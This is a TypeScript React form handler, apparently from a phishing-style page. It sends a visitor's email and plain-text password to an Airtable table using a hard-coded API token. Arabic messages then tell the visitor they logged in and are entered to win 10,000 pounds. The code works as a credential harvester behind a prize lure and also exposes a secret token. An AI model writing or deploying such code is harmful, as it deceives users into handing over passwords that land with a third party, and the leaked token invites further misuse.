const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  setIsLoading(true);

  const data = {
    fields: {
      Email: email,
      Password: password,
      Timestamp: new Date().toISOString(),
    },
  };

  try {
    const response = await fetch('https://api.airtable.com/v0/appVIknwkh8pEH2er/tblLoaHmFwooqY5JP', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer patJMWOqodjoUQncO.89330338665fb59c4ecb238ddfd32e31495ab6758486868777a999c3522447d3',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    const result = await response.json();
    console.log('Response:', result);

    if (response.ok) {
      toast({
        title: "تم تسجيل الدخول بنجاح!",
        description: "أنت الآن مسجل للمشاركة في فرصة ربح 10,000 جنيه!",
      });
    } else {
      throw new Error('فشل في تسجيل البيانات');
    }
  } catch (error) {
    console.error('Error:', error);
    toast({
      title: "حدث خطأ",
      description: "تعذر حفظ البيانات، حاول مرة أخرى.",
      variant: "destructive",
    });
  } finally {
    setIsLoading(false);
  }
};
